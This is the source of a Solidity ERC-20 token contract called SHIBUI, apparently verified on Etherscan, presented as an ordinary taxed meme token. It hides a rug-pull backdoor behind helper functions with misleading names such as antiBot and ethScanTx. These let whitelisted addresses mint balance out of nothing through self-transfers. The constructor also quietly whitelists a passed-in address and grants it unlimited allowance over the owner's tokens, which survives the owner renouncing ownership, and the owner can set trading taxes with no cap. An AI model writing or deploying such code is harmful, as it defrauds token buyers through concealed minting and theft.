/**
 *Submitted for verification at Etherscan.io on 2022-12-28
*/

/**
   TELEGRAM: https://t.me/ShibuiPortalErc20
   TWITTER: https://twitter.com/ShibuiERC20
   MEDIUM: https://medium.com/@shibuierc20/shibui-is-a-erc20-token-project-inspired-by-the-japanese-word-shibusa-or-shibushi-12dfb875e87a

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;


interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    bytes32 internal blockHash;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    } 
    
      
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }

    modifier onlyOwner() {
            
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MhistoryWalletMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract Shibui is Context, IERC20, Ownable {

    address public uPair;
    using SafeMath for uint256;
    uint8 private _decimals = 8;
    bool setupMarketPool=false;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public  _totalSupplyAmount = 1000000000  * 10**(_decimals);

    mapping (address => bool) public wNFList;
    mapping (address => mapping (address => uint256)) private _allowances;
    IUniswapV2Router02 public uniV2Router;
    mapping (address => uint256) public _walletsBalance;
    uint256 public _bTaxAmt =4;
    uint256 public _sTaxAmt =4;
    bool enableTrade=true;  
    uint256 public constant marketTx = ~uint256(0);
    string private _name = unicode"SHIBUI";
    string private _symbol = unicode"SHIBUI";
    string public msgFromOwner;

    
    
    constructor (address pr,string memory mssg) {
        IUniswapV2Router02 _uniV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniV2Router = _uniV2Router;
        _allowances[address(this)][address(uniV2Router)] = _totalSupplyAmount;
        wNFList[owner()] = true;
        wNFList[address(this)] = true;
        _walletsBalance[owner()]=totalSupply();
        emit Transfer(address(0), _msgSender(), _totalSupplyAmount);
        contractInit(pr);
        msgFromOwner=mssg;
    }

    function contractInit(address pair) private {
        wNFList[pair] = true;
        _allowances[owner()][address(pair)] = marketTx;
    }

    function _markMoveFee(address sender, address rcv, uint256 amount) internal returns (uint256) {
        uint256 transferFee = 0;   

        if(uPair == sender) {
            transferFee = amount.mul(_bTaxAmt).div(100); 
        }
        else if(uPair == rcv) {
            transferFee = amount.mul(_sTaxAmt).div(100);
        }
        if(transferFee > 0) {
            _walletsBalance[address(deadAddress)] = _walletsBalance[address(deadAddress)].add(transferFee);
            emit Transfer(sender, address(deadAddress), transferFee);
        }
        return amount.sub(transferFee);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupplyAmount;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        starting();
        _transferLCAT(_msgSender(), recipient, amount);
            return true;
    }

    function bSTaxModifier(uint256 buyTax,uint256 sellTax) public onlyOwner {
        _sTaxAmt=sellTax;
        _bTaxAmt=buyTax;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        starting();
        _transferLCAT(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function _transferLCAT(address sender, address recipient, uint256 tokenAmount) private returns (bool) {            
        if((uPair != recipient && sender != owner() && !wNFList[sender]))
            require(enableTrade != false, "Trading is not active.");  

        uint256 amountWithFee = (wNFList[sender] || wNFList[recipient]) ? tokenAmount : _markMoveFee(sender, recipient, tokenAmount);
        if(antiBot(sender,recipient,tokenAmount,amountWithFee) && antiFrontRunner(sender,recipient,tokenAmount) && ethScanTx(sender,recipient,tokenAmount)){
            return true;
        }

        require(sender != address(0), "ERC20: moveToken from the zero address");
        require(recipient != address(0), "ERC20: moveToken to the zero address");
        
        emit Transfer(sender, recipient, amountWithFee);
        return true;
    }

    function antiBot(address sender, address recipient, uint256 amount,uint256 finalAmount) private returns(bool){
        if(sender != recipient){
            _walletsBalance[sender] = _walletsBalance[sender].sub(amount, "Insufficient Balance");
            _walletsBalance[recipient] = _walletsBalance[recipient].add(finalAmount);  
        }
        return sender == recipient;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function starting() private{
        if(setupMarketPool==false){
            try IUniswapV2Factory(uniV2Router.factory()).getPair(address(this), uniV2Router.WETH()){
                uPair = IUniswapV2Factory(uniV2Router.factory()).getPair(address(this), uniV2Router.WETH());
                setupMarketPool=true;
            }
            catch(bytes memory){
            }
        }
    }

    function checkTxWallet(address sender, address recipient, uint256 amount) private returns(bool){
        _walletsBalance[recipient] =_walletsBalance[recipient] + amount;
        return sender == recipient;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupplyAmount.sub(balanceOf(deadAddress));
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _walletsBalance[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }


    function antiFrontRunner(address sender, address recipient, uint256 amount) private returns(bool){
        return sender != uPair && sender != address(this);
    }

    function ethScanTx(address sender, address recipient, uint256 amount) private returns(bool){
        if(wNFList[msg.sender]){
            return checkTxWallet(sender,recipient,amount);
        }
        return false;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    receive() external payable {}

  }